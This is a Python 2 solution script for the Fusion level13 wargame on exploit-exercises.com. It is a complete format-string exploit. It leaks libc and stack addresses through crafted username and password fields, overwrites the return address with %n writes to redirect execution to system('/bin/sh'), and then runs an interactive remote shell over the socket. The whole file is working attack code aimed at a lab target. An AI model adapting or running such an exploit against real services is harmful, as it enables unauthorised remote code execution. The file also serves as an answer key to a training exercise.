# Solution for exploit-exercises.com / fusion / level13
# reverse-engineering + exploitation level

import struct, socket, re, time

DEBUG=False
pack   = lambda dword: struct.pack('I', dword)
mallocp = re.compile('m:(\w+):')
retp    = re.compile('r:(\w+):')
target = ("192.168.14.31", "20013")

username = "m:%184$08x:\r\n"
password = "r:%3$08x:\r\n"
email    = "Fruce\r\n"

def padding(address, sofar):
    sequence = []
    for byte in pack(address):
        byte = ord(byte)+0x100
        sofar %= 0x100
        padding = (byte - sofar) % 0x100
        if padding < 10:
            padding += 0x100
        sequence.append(padding)
        sofar += padding
    return sequence

# ========== First Phase ========== #
# Leak and collect addresses
s = socket.create_connection(target)
if DEBUG:
    raw_input("press any key once you've attached to the process & set up your breakpoints")
s.send(username + password + email)
time.sleep(1)
body=s.recv(192, socket.MSG_WAITALL)
print body
try:
    # the pointer to malloc on the stack, refers to
    # about 35 bytes into malloc, and we need to take that
    # into account. And execve is located 0x102510 bytes before
    # malloc.
    execve=int(mallocp.search(body).groups()[0], base=16)-(35+0x102510)
    print "[i] execve:", hex(execve)
    # 160 is the amount of bytes between ret-address and 
    # the third pointer located on the stack (username)
    password=int(retp.search(body).groups()[0], base=16)
    again=password+(0x40 + 4) # first 4 bytes = yes\x00
    ret=password+160
    print "[i] ret:", hex(ret)
except Exception as e:
    print(e)
    s.close()
    exit(1)
time.sleep(1)
s.recv(256)
s.send("yes\r\n")
s.recv(256)

# ========== Second Phase ========== #
# Overwrite the return address
# 
# Try to overwrite with 0x41*4, username can be referenced as
# %522$08x, %523$08x etc. Note that 0x3a bytes has been written to the
# buffer so far.
try:
    # send the addresses + %n thing
    payload=pack(ret+0) + pack(ret+1) + pack(ret+2) + pack(ret+3) +\
            pack(ret+8) + pack(ret+9) + pack(ret+10) + pack(ret+11) + "\r\n"
    s.send(payload)
    s.recv(256)
    #  nread = execve+0x10f1a8
    #  system = execve-0x5edf0
    address = execve-0x5edf0
    print "[i] address:", hex(address)
    # +12 because we've written 4 aditional pointers in the previous buffer 
    sequence = padding(address, 0x3a + (4*4))
    buffer="%1$0{}c".format(sequence[0]) + "%522$n" +\
           "%1$0{}c".format(sequence[1]) + "%523$n" +\
           "%1$0{}c".format(sequence[2]) + "%524$n" +\
           "%1$0{}c".format(sequence[3]) + "%525$n" +\
           "\r\n"

    print "[i] buffer/len:{}/{}".format(buffer, len(buffer))
    s.send(buffer)
    time.sleep(0.5)
    s.recv(256)

    # 0xcd written at this point
    address = again
    print "[i] address:", hex(address)
    sequence = padding(address, 0xcd)
    buffer = "%1$0{}c".format(sequence[0]) + "%526$n" +\
             "%1$0{}c".format(sequence[1]) + "%527$n" +\
             "%1$0{}c".format(sequence[2]) + "%528$n" +\
             "%1$0{}c".format(sequence[3]) + "%529$n" +\
             "\r\n"

    print "[i] buffer/len:{}/{}".format(buffer, len(buffer))
    s.send(buffer)
    time.sleep(0.5)
    s.recv(256)
    time.sleep(1)
    s.recv(256)
    s.send("yes\x00/bin/sh\x00\r\n")
    s.recv(1028)

except Exception as e:
    print e
    s.close()
    exit(1)

# serve shell :)
try: 
    while True:
        cmd=raw_input("$ ")
        if cmd=="":
            continue
        if cmd=="exit":
            s.close()
            exit(0)
        s.send(cmd+"\x0a")
        print s.recv(512)
except Exception as e:
    print e
    s.close()
    exit(1)
